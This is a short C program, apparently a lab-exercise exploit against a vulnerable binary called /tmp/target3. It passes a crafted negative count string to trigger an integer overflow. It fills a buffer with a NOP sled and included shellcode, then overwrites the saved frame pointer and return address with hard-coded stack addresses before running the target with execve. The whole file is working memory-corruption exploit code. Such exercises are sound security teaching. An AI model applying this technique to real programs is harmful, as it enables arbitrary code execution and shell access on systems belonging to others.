#include "shellcode.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target3"
#define NOP 0x90

int main(void) {
  char *args[3];
  char *env[1];

  char *count_str = "-2147483487,";
  int count_len = strlen(count_str);
  int shell_len = strlen(shellcode);

  char buf[count_len + 161 * 16];
  memset(buf, NOP, sizeof(buf));

  memcpy(buf, count_str, count_len);
  memcpy(buf + count_len + 160 * 16 - shell_len, shellcode, shell_len);
  strcpy(buf + count_len + 160 * 16, "\x78\xf4\xff\xbf"   // sfp
                                     "\x48\xea\xff\xbf"); // ret

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
